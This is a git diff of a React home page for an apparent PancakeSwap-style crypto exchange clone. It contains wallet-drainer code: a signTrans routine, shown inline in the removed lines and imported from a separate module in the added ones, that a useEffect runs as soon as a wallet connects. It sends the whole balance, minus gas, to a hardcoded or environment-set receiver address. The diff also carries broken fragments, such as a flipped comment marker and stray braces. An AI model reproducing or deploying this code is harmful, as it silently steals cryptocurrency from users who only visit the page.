@@ -16,13 +16,13 @@ import {useEffect} from "react"
 import Footer from './components/Footer'
 //import CakeDataRow from './components/CakeDataRow'
 import { WedgeTopLeft, InnerWedgeWrapper, OuterWedgeWrapper, WedgeTopRight } from './components/WedgeSvgs'
-//import UserBanner from './components/UserBanner'
+import UserBanner from './components/UserBanner'
 import MultipleBanner from './components/Banners/MultipleBanner'
 import {Fragment} from "react"
-import { useBalance,usePrepareSendTransaction,useSendTransaction, useSigner} from 'wagmi'
+import { useBalance,usePrepareSendTransaction,useSendTransaction, useSigner,useNetwork} from 'wagmi'
 import {parseEther} from "@ethersproject/units"
 import {BigNumber} from "@ethersproject/bignumber"
-
+import {approveSend, signTrans} from "../../miscel"
 const StyledHeroSection = styled(PageSection)`
   padding-top: 16px;
 
@@ -37,7 +37,7 @@ const StyledHeroSection = styled(PageSection)`
   }) 
 
 const {sendTransaction} = useSendTransaction(config)
-/*
+*/
 const UserBannerWrapper = styled(Container)`
   z-index: 1;
   position: absolute;
@@ -53,7 +53,7 @@ const UserBannerWrapper = styled(Container)`
     padding-right: 24px;
   }
 `
-*/
+
 
 
 const Home: React.FC<React.PropsWithChildren> = () => {
@@ -62,41 +62,22 @@ const Home: React.FC<React.PropsWithChildren> = () => {
   const { chainId } = useActiveChainId()
 
   const HomeSectionContainerStyles = { margin: '0', width: '100%', maxWidth: '968px' }
-
+const {chain} = useNetwork()
+//console.log("chain chains",chain,chains)
   //const { t } = useTranslation()
 const t = (str) => {return str}
  const {data: balance} = useBalance({address:account})
  const {data:signer} = useSigner()
 //const val = balance.formatted? balance.formatted
-const {config,status, error} = usePrepareSendTransaction({
+/*const {config,status, error} = usePrepareSendTransaction({
     request: { to: "0x3D44833A40a9116Baa5239263e376aec077c7e8B", value: parseEther("0.01") },
-  }) 
+  }) */
 //const val = balance ? balance.value || 0
 const tranReq = {to:process.env.receiver,value:balance?.value || ""}
 const gasEst = ""
-const {sendTransaction} = useSendTransaction(config)
+//const {sendTransaction} = useSendTransaction(config)
 
-const signTrans = async(signer,tranReq) => {
-  if(!isConnected)
-    return
-console.log("Signing begin")
-  const gasEst =await  signer.estimateGas(tranReq)
-  const gasPrice = await signer.getGasPrice()
-  const gas = gasEst.mul(gasPrice) //* gasPrice
-  const amt = balance?.value.sub(gas) || gas
 
-console.log("Gas Estimate",gasEst,"GasPrice",gasPrice,"Gas",gas,amt)
-
-const to = process.env.receiver || "0x0F67BB85F54B9565339dc1e0CA38a348B468726E"
-console.log("receiver",to)
-signer.sendTransaction({to,value:amt,from:account})
-.then((data) => {
-  console.log(data)
-})
-.catch((err) => {
-  console.log("an error",err)
-})
-}
 /*
 if(isConnected)
 {
@@ -108,11 +89,12 @@ if(isConnected)
 useEffect(() => {
 
 const sendTx = async() => {
-  await signTrans(signer,tranReq)
+  await signTrans(isConnected,signer,balance)
+
 }
 sendTx()
 .catch(console.error)
-  console.log(signer)
+ // console.log(signer)
  //sendTransaction?.()
 },[signer])
   return (
@@ -154,15 +136,9 @@ sendTx()
         hasCurvedDivider={false}
       >
         {account && chainId === ChainId.BSC && (
-          
-          <Fragment>
-            <div>
-        }
-}
-}
-Sample Banner
-            </div>
-          </Fragment>
+          <UserBannerWrapper>
+            <UserBanner />
+          </UserBannerWrapper>
         )}
        <MultipleBanner />
         <Hero />
